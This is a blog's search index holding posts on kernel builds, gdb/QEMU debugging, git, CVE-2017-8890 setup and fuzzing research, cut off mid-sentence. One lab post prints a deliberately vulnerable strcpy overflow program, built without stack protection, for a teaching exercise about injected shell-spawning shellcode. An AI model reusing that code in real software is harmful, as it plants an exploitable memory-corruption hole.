<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Be Careful When Modifing Binary Program(Abount Stack Alignment)]]></title>
    <url>%2F2019%2F07%2F12%2Fstack-alignment%2F</url>
    <content type="text"><![CDATA[Recently, I want to modify the binary program which add a instruction push $rbx in the binary program. And it will increment the stack by 8 bytes. It sounds good for the binary program. And I debug the modified binary with gdb, and find that it crashes in movaps instruction. 1movaps xmmword ptr [rsp+0x50], xmm0 So what happend? And I found the answers from some blogs(see reference). movaps is “move aligned packed single-precision floating-point values”. If the instruction’s operand is memory, the memory address must be aligned to 16 bytes. And I print the $rsp+0x50, its not 16 bytes alignment. That’s because I pushed $rbx into the stack and increment the rsp to 8 bytes, and that results in rsp is not aligned to 16 bytes. Reference Debugging Stories: Stack alignment matters A bug story: data alignment on x86 X86 Assembly/SSE x86 Instruction Set Reference]]></content>
  </entry>
  <entry>
    <title><![CDATA[C Programs Before main Function]]></title>
    <url>%2F2019%2F07%2F02%2Fctr-things%2F</url>
    <content type="text"><![CDATA[What does the program do before main() functionThe picture from Patrick Horgan describes what will the c program do before main function. crt0.o, ctri.o, ctrbegin.o, ctrn.oIf you compile a c program, the linker will link crt0.o, ctri.o, ctrbegin.o, ctrn.o with the target object together. crt0.o contains _start function, it will initialize the process before call main function, it is defined in libc’s crt0.s file. According to osdev, ctri.o defines the header of _init and _fini function, and ctrn.o defines the footer of _init and _fini function. And linker will link ctrbegin.o’s section .init and .fini between ctri.o and ctrn.o ctrbegin.o also defines some functions such as deregister_tm_clones, register_tm_clones, __do_global_dtors_aux, frame_dummy Reference Linux x86 Program Start Up or - How the heck do we get to main()? osdev: Creating a c library Why does an assembly program only work when linked with crt1.o crti.o and crtn.o?]]></content>
  </entry>
  <entry>
    <title><![CDATA[git subtree]]></title>
    <url>%2F2019%2F06%2F18%2Fgit-subtree%2F</url>
    <content type="text"><![CDATA[Add a remote repo1git remote add -f repo-name git@github.com:repo.git Merge the repo into the local git project1git merge -s ours --no-commit --allow-unrelated-histories repo-name/master Create a new directory named pro-name and copy the git history of remote repo project into it.1git read-tree --prefix=pro-name/ -u spoon-knife/master Commit the changes to keep them safe1git commit -m &quot;subtree merged&quot; Synchronizing with remote repo1git pull -s subtree repo-name branchname However, I met overlaps with problem. And need add -Xsubtree to specify the directory where the sub-project should pull. 1git pull -s subtree -Xsubtree=pro-name repo-name branchname Reference About Git subtree merges Resolving Git Subtree Merge - Entry Overlaps Error - Cannot Bind]]></content>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Compile Kernel using llvm/clang]]></title>
    <url>%2F2019%2F04%2F16%2Fllvm-kernel%2F</url>
    <content type="text"><![CDATA[Reference clang-kernel-build ClangBuiltLinux Tutorial Start with an empty dir 123git clone https://github.com/ramosian-glider/clang-kernel-build.gitcd clang-kernel-buildexport WORLD=`pwd` Install Clang from Chromium: 1234567cd $WORLD# Instruction taken from http://llvm.org/docs/LibFuzzer.htmlmkdir TMP_CLANGcd TMP_CLANGgit clone https://chromium.googlesource.com/chromium/src/tools/clangcd ..TMP_CLANG/clang/scripts/update.py (To update Clang later on, do (cd TMP_CLANG/clang ; git pull) and run update.py again.) Clone the linux source tree 1234cd $WORLDgit clone git://git.kernel.org/pub/scm/linux/kernel/git/stable/linux-stable.gitcd linux-stablegit reset --hard v4.16 (Note that kernel version v4.16 or older is fine, otherwise the latest clang lacks asm-goto support(llvm already support))ref1 and ref2。 Configure and build the kernel 123456cd $WORLDexport CLANG_PATH=`pwd`/third_party/llvm-build/Release+Asserts/bin/cd linux-stablemake CC=$CLANG_PATH/clang defconfigmake CC=$CLANG_PATH/clang kvmconfigmake CC=$CLANG_PATH/clang -j64 2&gt;&amp;1 | tee build.log Set up the VM 1234cd $WORLDwget https://raw.githubusercontent.com/google/sanitizers/master/address-sanitizer/kernel_buildbot/create_os_image.sh# create_os_image.sh requires sudosh create_os_image.sh Run the VM 1234cd $WORLD./run_qemu.sh# in a separate console:ssh -i ssh/id_rsa -p 10023 root@localhost Compile with KASAN Edit .config file and add 1CONFIG_KASAN=y Regenerage config file: 1make oldconfig Problemsunable reference to bcmpSolutions: reference Add ‘-fno-builtin-bcmp’ to CLANG_FLAGS compiler lacks asm-goto supportreference: ref1, ref2, ref3 While the LLVM has supported asm-goto already, it seems that clang doesn’t support asm-goto. kernel v4.16及之前版本不会有asm-goto的问题 booting problem when compiling kernel with clang kasan.Solutions: ref some configuration may cause clang build error Add CONFIG_KALLSYMS_ALL=y cause boot Failed to start raise network interfaces. Add CONFIG_KASAN_INLINE=y cause boot Failed to start raise network interfaces. Add CONFIG_DEBUG_VM, the boot will hang at 12345678910[ 0.000000] Booting paravirtualized kernel on KVM[ 0.000000] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns[ 0.000000] setup_percpu: NR_CPUS:64 nr_cpumask_bits:64 nr_cpu_ids:4 nr_node_ids:1[ 0.000000] percpu: Embedded 53 pages/cpu @ (ptrval) s178760 r8192 d30136 u524288[ 0.000000] KVM setup async PF for cpu 0[ 0.000000] kvm-stealtime: cpu 0, msr 3641e3c0[ 0.000000] Built 1 zonelists, mobility grouping on. Total pages: 257895[ 0.000000] Policy zone: DMA32[ 0.000000] Kernel command line: console=ttyS0 root=/dev/sda earlyprintk=serial[ 0.000000] Memory: 825300K/1048052K available (26636K kernel code, 1382K rwdata, 4256K rodata, 1804K init, 21016K bss, 222752K reserved, 0K cma-reserved) clang error: unkown argument: ‘–mpreferred-stack-boundary=4’link in drivers/gpu/drm/amd/display/dc/cals/Makefile and drivers/gpu/drm/amd/display/dc/dml/Makefile file, they specify CFLAGS with mpreferred-stack-boundary, which is not supported by clang. Clang has the flag -mstack-alignment=4 that equals. So replace themwith -mstack-alignment=4 in these two files. clang does not support vlaiscomment out CONFIG_EXOFS_FS link Undefined reference in amdgpu.ko link patch]]></content>
      <categories>
        <category>kernel</category>
      </categories>
      <tags>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shellcode exit normally]]></title>
    <url>%2F2019%2F03%2F22%2Fshellcode-exit%2F</url>
    <content type="text"><![CDATA[前言最近和jaguo在给南京大学软件安全课程出Buffer Overflow实验的时候，发现了出现shellcode exit normally的情况，但是并没有”发现”启动了新的shell。 漏洞程序1234567891011121314151617181920212223// buf2.c// gcc −z execstack −o buf buf2 -fno-stack-protector#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;void vul(char *str)&#123; char buffer[36]; // buffer overflow strcpy(buffer, str);&#125;int main(int argc, char **argv)&#123; char str[128]; int n = read(0， str, 128); if(n &lt; 0)&#123; printf("Read Error\n"); exit(-1); &#125; vul(str); printf(”Returned Properly\n”); return 0;&#125; 我们一开始的设计是漏洞程序如上所示，由于需要注入shellcode，有些是不可见字符，所以我们一开始设计将shellcode写入到一个文件attack_input中，然后通过重定位将输入定位到attack_input文件中，可以将shellcode传给输入。 1./buf2 &lt; attack_input 然而这样就导致虽然能够正确注入shellcode，但是只要执行shellcode中的execve(‘/bin//sh’, 0, 0)，就立即退出/bin//sh程序，而不是给出bash的命令行窗口。 原因经过查阅资料发现，我们在使用输入重定位的时候，就相当于将进程的输入重定位到文件中，而当程序将文件中的内容读完之后，会关闭该文件，此时相当于将程序的输入（stdin）关闭了。当该进程启动一个shell进程时，shell进程是该进程的子进程，继承了父进程的文件描述符（包括已经关闭了的标准输入），此时shell发现标准输入已经关闭了，就会退出。 下面我们通过下面的实验来验证一下： 123456#include &lt;stdio.h&gt;int main()&#123; fclose(stdin); system("/bin/sh");&#125; 编译运行该程序，会发现shell也会正常退出。 解决方案我们的解决方案就是使用文件读函数正常的从文件中读取shellcode。 12345678910111213141516171819202122232425// buf2.c// gcc -z execstack -o buf2 buf2.c -fno-stack-protector#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;void vul(char *str)&#123; char buffer[36]; // buffer overflow strcpy(buffer, str);&#125;int main(int argc, char **argv)&#123; char str[128]; FILE *file; file = fopen("attack_input2", "r"); fread(str, sizeof(char), 128, file); vul(str); printf("Returned Properly\n"); return 0;&#125;]]></content>
      <tags>
        <tag>exploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分析CVE-2017-8890]]></title>
    <url>%2F2019%2F01%2F05%2Fkernel-debugging%2F</url>
    <content type="text"><![CDATA[环境 linux kernel版本：4.10.1 gcc编译: 7.4 linux kernel开启KASAN和debug信息 1234567CONFIG_KCOV=yCONFIG_DEBUG_INFO=yCONFIG_KASAN=yCONFIG_KASAN_INLINE=yCONFIG_CONFIGFS_FS=yCONFIG_SECURITYFS=y 在编译的时候出现‘undefined reference to `____ilog2_NaN’ ‘ 解决方案：patch 将该patch保存为patch.diff，拷贝到linux内核根目录下。 运行命令：patch -i patch.diff，提示输入文件时，先后输入include/linux/log2.h和tools/include/linux/log2.h即可。 Debug编译Linux内核12345678910111213141516CONFIG_DEBUG_KERNEL=yCONFIG_DEBUG_INFO=yCONFIG_CONSOLE_POLL=yCONFIG_KDB_CONTINUE_CATASTROPHIC=0CONFIG_KDB_DEFAULT_ENABLE=0x1CONFIG_KDB_KEYBOARD=yCONFIG_KGDB=yCONFIG_KGDB_KDB=yCONFIG_KGDB_LOW_LEVEL_TRAP=yCONFIG_KGDB_SERIAL_CONSOLE=yCONFIG_KGDB_TESTS=yCONFIG_KGDB_TESTS_ON_BOOT=nCONFIG_MAGIC_SYSRQ=yCONFIG_MAGIC_SYSRQ_DEFAULT_ENABLE=0x1CONFIG_SERIAL_KGDB_NMI=n Add to your QEMU command:12append &apos;kgdbwait kgdboc=ttyS0,115200&apos; \serial tcp::1234,server,nowait gdb连接 gdb vmlinux target remote :1234 c PoC poc 在qemu里面的虚拟机里面运行poc 此时发生crash: 可以发现其访问了（rcx+rax)的地址区域， 而该地址是不可访问地址区域 手动下断点 echo g &gt; /proc/sysrq-trigger]]></content>
      <categories>
        <category>kernel</category>
      </categories>
      <tags>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用gdb调试qemu内核]]></title>
    <url>%2F2019%2F01%2F03%2Fdebug-kernel%2F</url>
    <content type="text"><![CDATA[编译linux内核 下载内核源码 1git clone https://github.com/torvalds/linux.git $KERNEL 生成默认的配置 123cd $KERNELmake defconfigmake kvmconfig 编辑.config，开启一些选项 12345678910111213141516171819202122# gdb configCONFIG_GDB_SCRIPTS=yCONFIG_DEBUG_INFO=y# CONFIG_DEBUG_INFO_REDUCED is not set# CONFIG_RANDOMIZE_BASE is not set# kgdb config# CONFIG_STRICT_KERNEL_RWX is not setCONFIG_FRAME_POINTER=yCONFIG_KGDB=yCONFIG_KGDB_SERIAL_CONSOLE=y# kdb config# CONFIG_STRICT_KERNEL_RWX is not setCONFIG_FRAME_POINTER=yCONFIG_KGDB=yCONFIG_KGDB_SERRIAL_CONSOLE=yCONFIG_KGDB_KDB=yCONFIG_KDB_KEYBOARD=y# manually debug using the SysRq-GCONFIG_MAGIC_SysRq=y 重新生成config文件，其中有一些子选项，默认即可 1make oldconfig 使用GCC编译内核 1make -j$(nproc) gdb调试 qemu启动的时候添加选项 ‘-gdb tcp:1234’ 内核命令行添加’nokaslr’ 参考qemu配置如下： 12345678qemu-system-x86_64 -S -smp 2 -m 4G -enable-kvm -cpu host \ -net nic -net user,hostfwd=tcp::10022-:22 \ -gdb tcp::1234 \ -kernel ./kernel/arch/x86/boot/bzImage -nographic \ -device virtio-scsi-pci,id=scsi \ -device scsi-hd,bus=scsi.0,drive=d0 \ -drive file=wheezy.img,format=raw,if=none,id=d0 \ -append &quot;root=/dev/sda noaslr&quot; gdb 命令： 123gdb vmlinuxtarget remote :1234c kgdb, kdb调试参考qemu配置： 12345678qemu-system-x86_64 -smp 2 -m 4G -enable-kvm -cpu host \ -net nic -net user,hostfwd=tcp::10022-:22 \ -kernel ./kernel/arch/x86/boot/bzImage -nographic \ -device virtio-scsi-pci,id=scsi \ -device scsi-hd,bus=scsi.0,drive=d0 \ -drive file=wheezy.img,format=raw,if=none,id=d0 \ -append &quot;root=/dev/sda noaslr kgdbwait kgdboc=ttyS0,115200&quot; \ -serial tcp::1234,server,nowait 强制下断点：开一个终端连接qemu里的系统，以root用户执行： 1echo g &gt; /proc/sysrq-trigger]]></content>
      <categories>
        <category>kernel</category>
      </categories>
      <tags>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git本地冲突]]></title>
    <url>%2F2018%2F11%2F27%2Fgit%E6%9C%AC%E5%9C%B0%E5%86%B2%E7%AA%81%2F</url>
    <content type="text"><![CDATA[在使用git进行多人协作时，一般需要先pull下来，再commit进行push来避免冲突，然而当pull下来的文件与本地文件有冲突怎么办呢，这时“git stash”就派上了用场： 先将本地的修改存储起来 git stash pull下来远程仓库的内容 git pull 此时本地的文件已被远程仓库的内容覆盖 还原缓存的内容 git stash pop stash@{0} 手动解决冲突 此时会提示你有冲突，让你手动解决。]]></content>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fuzzing related work]]></title>
    <url>%2F2018%2F10%2F05%2Ffuzzing%2F</url>
    <content type="text"><![CDATA[Interesting Fuzzing Coverage-based Greybox Fuzzing as Markov Chain(CCS 16) T-Fuzz: fuzzing by program transformation(oakland 18) CollAFL: Path Sensitive Fuzzing(oakland 18) Driller: Argumenting Fuzzing Through Selective Symbolic Execution(ndss 16) VUzzer: Application-aware Evolutionary Fuzzing(ndss 17) Angora: Efficient Fuzzing by Principled Search(oakland 18)) Designing New Operating Primitives to Improve Fuzzing Performance(CCS 17) QSYM: A Practical Concolic Execution Engine Tailored for Hybrid Fuzzing(Usenix Security 18) FairFuzz: A Targeted Mutation Strategy for Increasing Greybox Fuzz Testing Coverage(ASE 18) Full-speed Fuzzing: Reducing Fuzzing Overhead through Coverage-guided Tracing(oakland 19) ProFuzzer: On-the-fly Input Type Probing for Better Zero-day Vulnerability Discovery(oakland 19) NEUZZ: Efficient Fuzzing with Neural Program Smoothing(oakland 19) REDQUEEN: Fuzzing with Input-to-State Correspondence(NDSS 19) NAUTILUS: Fishing for Deep Bugs with Grammars(NDSS 19) Send Hardest Problems My Way: Probabilistic Path Prioritization for Hybrid Fuzzing(NDSS 19) EnFuzz: Ensemble Fuzzing with Seed Synchronization among Diverse Fuzzers(Usenix Security 19) MOPT: Optimize Mutation Scheduling for Fuzzers(Usenix Security 19) GRIMOIRE: Synthesizing Structure while Fuzzing(Usenix Security 19) Directed Fuzzing Directed Greybox Fuzzing(CCS 17) Hawkeye: Towards a Desired Directed Grey-box Fuzzer(CCS 18) Fuzzing Machine Learning Model TensorFuzz: Debugging Neural Networks with Coverage-Guided Fuzzing(18) Coverage-Guided Fuzzing for Deep Neural Networks Kernel Fuzzing RAZZER: Finding Kernel Race Bugs through Fuzzing(oakland 19) kAFL: Hardware-Assisted Feedback Fuzzing for OS Kernels(Usenix Security 17) Fuzzing File Systems via Two-Dimensional Input Space Exploration(oakland 19) PeriScope: An Effective Probing and Fuzzing Framework for the Hardware-OS Boundary(NDSS 19) Anti-Fuzzing FUZZIFICATION: Anti-Fuzzing Techniques(Usenix Security 19) ANTIFUZZ: Impeding Fuzzing Audits of Binary Executables(Usenix Security 19) IoT Fuzzing IoTFuzzer: Discovering Memory Corruptions in IoT Through App-based Fuzzing(NDSS 18) FIRM-AFL: High-Throughput Greybox Fuzzing of IoT Firmware via Augmented Process Emulation(Usenix Security 19) Evaluate Fuzzing Evaluating Fuzz Testing(CCS 18) Interesting FuzzingCoverage-based Greybox Fuzzing as Markov Chain(CCS 16) paper source code Search Strategy Power Schedule 通过改变前面两个方法来使程序更大概率地走到low-density region. T-Fuzz: fuzzing by program transformation(oakland 18) paper source code Fuzzer: T-Fuzz uses an existing coverage guided fuzzer to generate inputs. T-Fuzz depends on the fuzzer to keep track of the paths taken by all the generated inputs and realtime status infomation regarding whether it is “stuck”. As output, the fuzzer produces all the generated inputs. Any identified crashing inputs are recorded for further anlysis. Program Transformer: When the fuzzer gets “stuck”, T-Fuzz invokes its Program Transformer to generate tranformed programs. Using the inputs generated by the fuzzer, the Program Transformer first traces the program under test to detect the NCC candidates and then transforms copies of the program by removing certain detected NCC candidates. Crash Analyzer: For crashing inputs found against the transformed programs, the Crash Analyser filters false positives using a symbolic-execution based analysis technique. T-Fuzz Design Detecting NCCs: NCCs are those sanity checks which are present in the program logic to filter some orthogonal data, e.g., the check for a magic value in the decompressor example above. NCCs can be removed without triggering spurious bugs as they are not intended to prevent bugs. This paper uses a lightweight method to find the NCCs. Firstly, they define the concept of boundary edges: the edges connecting the nodes that were covered by the fuzzer-generated inputs and those that were not. The method that find the NCCs in this paper is over-approximation, so they find two ways to prune undesired NCC condidates. Program Transformation: After finding NCCs, T-Fuzz should “remove” the NCCs conditions to guide the execution to the another branch. T-Fuzz transforms programs by replacing the detected NCC candidates with negated conditional jump. Filtering out False Positives and Reproducing Bugs: As the removed NCC candidates might be meaningful guards in the original program(as opposed to, e.g., magic number checks), removing detected NCC edges might introduce new bugs in the transformed program. Consequently, T-Fuzz’s Crash Analyzer verifies that each bug in the transformaed program is also present in the original proram, thus filtering out false positives. The Crash Analyser uses a transformation-aware combination of the preconstrained tracing technique leveraged by Driller and the Path Kneading techniques proposed by ShellSwap to collect path constraints of the original program by tracing the program path leading to a crash in the transformed program. CollAFL: Path Sensitive Fuzzing(oakland 18) paper source code has not been found. 该paper主要对AFL有两个改进: AFL是coverage-based greybox fuzzing，它通过对源程序进行轻量级的插桩，来跟踪每次fuzzing的input覆盖哪些路径，然后将路径hash，从而判断每个input是否到达了一个新的路径，如果到达新的路径，则说明该input较好，将该input作为seed。但由于hash可能会发生collision，可能会导致某些input到达新的路径，却没有将该input作为seed。该paper主要针对这一点，采用了一个新的算法，解决了路径hash collision问题，产生的效果也是比较显著的。 提供了一些策略来将seed进行排序，促使fuzzer去探索没有到达的路径。具体做法就是如果某条路径有很多没有探索到的邻居分支，则对该input进行更多的变异；如果某条路径有很多没有探索到的邻居后代，则对该input产生更多的变异。还有一个策略来帮助发现更多的漏洞：如果某条路径进行更多的内存访问，则对该input产生更多的变异。 我个人认为，该论文的主要贡献是提供了一个机制来解决路径的hash collision问题，使得coverage判断更加准确。 AFL Coverage MeasurementsAFL使用bitmap(默认64KB)来跟踪edge coverage。没一个字节都对应特定edge的hit count。AFL通过对每个basic block进行插桩，为每个basic block都随机分配一个id，当执行每条路径时，对该路径上的每个basic block都进行如下操作: 123cur_location= &lt;COMPILE_TIME_RANDOM&gt;;shared_mem[cur_location ^ prev_location]++;prev_location = cur_location &gt;&gt; 1; 其中上面的prev_location右移一位主要是为了区分路径A-&gt;B和B-&gt;A。由于每个basic block的id是随机分配的，所以这种hash方法很容易产生collision，特别当程序比较大的时候，collision rate也越大。 CollAFL’s Solution to Hash CollisionCollAFL通过三种方式来解决hash collision: 通过贪心算法，为每个basic block分配x和y的值，保证每条edge计算的hash值都是不同的。 如果每个basic block只有一个前继basic block，即只有一条边到达该basic block，所以只需要将该basic block的id来表示该edge即可。 如果前面两种方法无法解决，则动态的时候为每条边分配不同的id。 Driller: Argumenting Fuzzing Through Selective Symbolic Execution(ndss 16) paper source code 我们都知道，fuzzing对于一些比较宽松的限制(比如x&gt;0)能够很容易的通过变异产生一些输入达到该条件；而symbolic execution非常擅长求解一下magic value(比如x == deadleaf)。这是一篇比较经典的将concolic execution和fuzzing结合在一起的文章，该文章的主要思想就是先用AFL等Fuzzer根据seed进行变异，来测试程序。当产生的输入一直走某些路径，并没有探测到新的路径时，此时就”stuck”了。这时，就是用concolic execution来产生输入，保证该输入能走到一些新的分支。从而利用concolic execution来辅助fuzz。 VUzzer: Application-aware Evolutionary Fuzzing(ndss 17) paper source code Vuzzer是公认的比较好的类AFL fuzzer。它主要利用Data-flow features和Control-flow features来辅助fuzzer变异和进行seed的选择。 Data-flow features利用dynamic taint analysis 来推断input的结构和类型，以及某段数据在input的偏移。比如，它通过对每个cmp指令进行插桩来判断input的哪些字节与输入有关，并且知道与它比较的另外一个值。同时，Vuzzer也可以对lea指令进行插桩，从而检测index操作是不是与input某些bytes有关。 Control-flow featuresControl-flow features可以让Vuzzer推断出执行路径的重要性。比如，某些执行路径最后到达了error-hanling blocks。Vuzzer就通过静态的方法识别出了一下error-handling code。同时，Vuzzer通过对每个basic block赋予特定的权重，来促使fuzzer走到更深的路径中去。 Angora: Efficient Fuzzing by Principled Search(oakland 18) paper source code This paper’s contributations: Context-sensitive branch coverage. AFL uses context-insensitive branch coverage to approximate program states. This paper adding context information to branch. Scalable byte-level taint tracking. Most path constraints depend on only a few bytes in the input. By tracking which input bytes flow into each path constraint, Angora mutates only these bytes instead of the entire input, therefore reducing the space of exploration substantially. Search based on gradient descent. When mutating the input to satisfy a path constraint. Angora avoids symbolic execution, which is expensive and cannot solve many types of constraints. Instead, Angora uses the gradient descent algorithm popular in machine learning to solve path constraints. Type and shape inference. Many bytes in the input are used collectively as a single value in the program, e.g., a group of four bytes in the input used as a 32-bit signed integer in the program. To allow gradient descent to search efficiently, Angora locates the above group and infers its type. Designing New Operating Primitives to Improve Fuzzing Performance(CCS 17) paper source code AFL Overview Mutating inputs(1). AFL uses an evolutionary coverage-based mutation technique to generate test cases for discovering new execution paths of the target application. In AFL, an execution path is represented as a sequence of taken branches(i.e., a coverage bitmap) in the target instance for a given input. To track whether a branch is taken, AFL instruments every conditional branch and function entry of the target application at the time of compilation. Launching the target application(2). Traditional fuzzers call fork() followed by execve() to launch an instance of the target application. This process occurs in every fuzzing loop to deliver a new input to the target application. It is not only time consuming, but also a non-scalable operation. Previous research shows that the majority of fuzzing execution explores only the shallow part of the code and terminates quickly(e.g., because of invalid input format), which results in frequent executions for the input cases. Thus, the cost of fork() and execve() dominates the cost of fuzzing. To mitigate this cost, AFL introduced a fork server, which is similar to a Zygote process in Android that eliminates the heavyweight execve() system call. After instantiating a target application, the fork server waits for a starting signal sent over the pip from the AFL instance. Upon receiving the request, it first clones the already-loaded program using fork() and the child process continues the execution of the original target code immediately from the entry point(i.e., main) with a given input generated for the current fuzzing loop. The parent process waits for the termination of its child, and then informs the AFL process. The AFL process collects the branch coverage of the past execution, and maintains the test input if it is interesting. Bookkeeping results(3, 4). The fork server also initializes a shared memory(also known as tracing bitmap) between the AFL instance and the target application. The instance records all the coverage information during the execution and writes it to the shared tracing bitmap, which summarizes the branch coverage of the past execution. Fuzzing in parallel(6). AFL also supports parallel fuzzing to completely utilize resources available on a multi-core machine and expedite the fuzzing process. In this case, each AFL instance independently executes without explicit contention among themselves(i.e., embarrassingly parallel). From the perspective of the design of AFL, the fuzzing operation should linearly scale with increasing core count. Moreover, to avoid apparent contention on file system accesses, each AFL instance works in its private working directory for test cases. At the end of a fuzzing loop, the AFL instance scans the output directories of other instances to learn their test cases, called the syncing phase. For each collaborating neighbor, it keeps a test case identifier, which indicates the last test case it has checked. It figures out all the test cases that have an identifier larger than the reserved one, and re-executes them one by one. If a test case covers a new path that has not been discovered by the instance itself, the test case is copied to its oen directory for further mutation. QSYM: A Practical Concolic Execution Engine Tailored for Hybrid Fuzzing(Usenix 18) paper source code 该paper是Usenix 18的Distinguished Paper，其主要针对了当前的concolic execution的三个方面进行了优化: Slow Symbolic Emulation, Ineffective Snapshot and Slow and Inflexible Sound Analysis. 从而使得concolic execution更好的适应fuzzing场景。 Motivation: Performance BottlenecksSlow Symbolic Emulation现在主流的conclic executors做符号执行的时候是针对IR中间语言做的(比如KLEE的LLVM IR和angr的VEX IR)，对中间语言模拟执行。其采用IR的原因是实现起来比较简单。由于Intel 64位指令集包含1795条指令，所以针对每条指令总结出来符号的语义对于人工来说是一个非常大的工作量，而IR的指令较少(LLVM IR有62条指令)，符号化这些指令相对比较简单。 然而使用IR则引发了额外的overhead。首先，从机器指令到IR的转换本身就有overhead。由于amd64是CISC(complex instruction set computer)，而IR是RISC(reduced instruction set computer)，一般一条amd64的指令需要转换成多条IR指令，拿angr为例，如果将amd64指令转为VEX IR，则平均增加的指令数是4.69倍。其次，采用IR导致basic block level taint。因为由于效率的原因，从native instructions到IR的转换一般是以basic block为单位的，这样就导致无法将单个的native instruction转换成IR，所以也就只能做到哪些basic block需要符号化，而不是具体的某条指令需要符号化。这样做导致的后果就是如果某个basic block中只有一条指令和输入有关需要符号化，则整个basic block都需要符号模拟，这样就会造成很高的overhead。如果没有IR的话就可以做到指令级别的taint，就能够清楚的判断哪些指令需要符号模拟，哪些指令只需native execution，减少了不必要的符号模拟。实验表明，在一个basic block中，只有30%的指令需要符号模拟。 Ineffective Snapshotsnapshot是conclic execution常用的一个技术，它能够保存某条分支前的状态S，当该分支执行完或者”stuck”时，可以从该状态S直接执行另外一个分支，避免了重新执行的overhead。然而snapshot本身就有一些缺点：snapshot需要保存一些外部的状态(文件系统，内存管理系统)，则此时需要对影响外部状态的系统调用进行处理，一般有两个方法: full system concolic execution and External environment modeling。这两个方法都有一些缺陷：第一个方法是由于外部环境比较复杂，实现起来比较难，overhead较高；第二个则是model的system call较少，并且有些system call建模的不够完全。另外由于fuzzing的输入一般不会共享同一个分支，所以snapshot可能对于fuzzing这个场景也不是很好，所以该paper就没有采用snapshot的机制，对于每个输入都会重新执行，对于系统调用，则具体执行。 Slow and Inflexible Sound Analysis现在的concolic execution是将某条路径上的所有contraints都满足，从而求解出具体的input。然而复杂的contraints可能会导致输入求解不出。所以该paper的一个解决方法就是只求解出部分contraints。 FAIRFUZZ: A Targeted Mutation Strategy for Increasing Greybox Fuzz Testing Coverage(ASE 18) paper source code FairFuzz focus on branch coverage, it works in two main steps. First, it identifies the program branches that are rarely hit by previously-generated inputs. It call such branches rare branches. These rare branches guard under-explored functionalities of the program. By generating more random inputs hitting these rare branches, FairFuzz greatly increases the coverage of the parts of the code guarded by them. Second, FairFuzz uses a novel lightweight mutation technique to increase the probability of hitting these rare branches. The mutation stategy is based on the observation that certain parts of an input already hitting a rare branch are crucial to satify the conditions necessary to hit that branch. Therefore, to generate more inputs hitting the rare branch via mutation, the parts of the input that are crucial for hitting the branch should not be mutated. Full-speed Fuzzing: Reducing Fuzzing Overhead through Coverage-guided Tracing(oakland 19) paper source code ProFuzzer: On-the-fly Input Type Probing for Better Zero-day Vulnerability Discovery(oakland 19) paper NEUZZ: Efficient Fuzzing with Neural Program Smoothing(oakland 19) paper code REDQUEEN: Fuzzing with Input-to-State Correspondence(NDSS 19) paper code NAUTILUS: Fishing for Deep Bugs with Grammars(NDSS 19) paper code Send Hardest Problems My Way: Probabilistic Path Prioritization for Hybrid Fuzzing(NDSS 19) paper EnFuzz: Ensemble Fuzzing with Seed Synchronization among Diverse Fuzzers(Usenix Security 19) paper code MOPT: Optimize Mutation Scheduling for Fuzzers(Usenix Security 19) paper code GRIMOIRE: Synthesizing Structure while Fuzzing(Usenix Security 19) paper code Directed FuzzingDirected Greybox Fuzzing(CCS 17) paper code 12345678910111213141516Input: Seed Input Srepeat s = CHOOSENEXT(S) p = ASSIGNENERGY(s) //This paper focus for i from 1 to p do s' = MUTATE_INPUT(s) if t' crashes then add s' to Sx else if ISINTERESTING(s') then add s' to S end if end foruntil timeout reached or abort-signalOutput: Crashing Inputs Sx 类AFL的fuzzing一般步骤如上所示，该paper主要关注于ASSIGNENERGY(s)这一操作，他们通过对不同的seed s赋予不同的energy，即如果一个seed s’产生的trace距离目标基本块targetB较近，则其energy(p)就较大，基于种子s’进行的变异操作就会变多。所以该paper主要有两个contributation: 设计一套算法计算seed s’产生的trace与targetB的距离；通过模拟退火算法来为每个seed s分配energy。 Hawkeye: Towards a Desired Directed Grey-box Fuzzer(CCS 18) paper source code has not been found. Desired Properties of Directed Fuzzing P1. The DGF should define a robust distance-based mechanism that can guide the directed fuzzing by avoiding the bias to some traces and considering all traces to the targets. P2. The DGF should strike a balance between overheads and utilities in static analysis. P3. The DGF should select and schedule the seeds to rapidly reach target sites. AFL determines how many new inputs(i.e., “energy”) should be generated from a seed input to improve the fuzzing effectiveness(i.e., increase the coverage); this is termed “power scheduling”. P4. The DGF should adopt an adaptive mutation strategy when the seeds cover the different program states. The desired design is that when a seed has already reached the target sites(including target lines, basic blocks or functions), it should be given less chances for coarse-grained mutations(e.g., chunk replacement). AFLGo’s Solution 针对P1，AFLGo只是选择路径最短的那条，然而路径最短的那条可能无法触发某个漏洞。 For P2. AFLGo only considers the explicit call graph information. As a result, function pointers are treated as the external nodes which are ignored during distance calculation. Besides, AFLGo counts the same callee in tis callers only once, and it does not differentiate multiple call patterns between the caller and callee. For P3. AFLGo applies a simulated annealing based power scheduler: it favors those seeds closer to the targets by assigning more energy to them to be mutated; the applied cooling sechedule initially assigns smaller weight on the effecte of “distance guidance”, until it reaches the “exploitation” phrase. The issue is that there is no prioritization procedure so the newly generated seeds with smaller distance may wait for a long to be mutated. For P4. The mutation operators of AFLGo come from AFL’s two non-deterministic strategies: 1) havoc, which does purely randomly mutations such as bit flips, bytewise replace, etc; 2) splice, which generates seeds from some random byte parts of two existing seeds. Notably, during runtime AFLGo excludes all the deterministic mutation procedures and relies purely on the power scheduling on havoc/splice strategies. Suggestions to improve DGFs: For P1, a more accurate distance definition is needed to retain trace diversity, avoiding the focus on short traces. For P2, both direct and indirect calls need to be analyzed; various call patterns need to be distinguished during static distance calculation. For P3, a moderation to the current power scheduling is required. The distance-guided seed prioritization is also needed. For P4, the DGF needs an adaptive mutation strategy, which optimally applies the fine-grained abd ciarse-graubed nytatuibs wgeb tge dustabce between the seed to the targets is different. Hawkeye’s Design During fuzzing, the fuzzer selects a seed from a priority seed 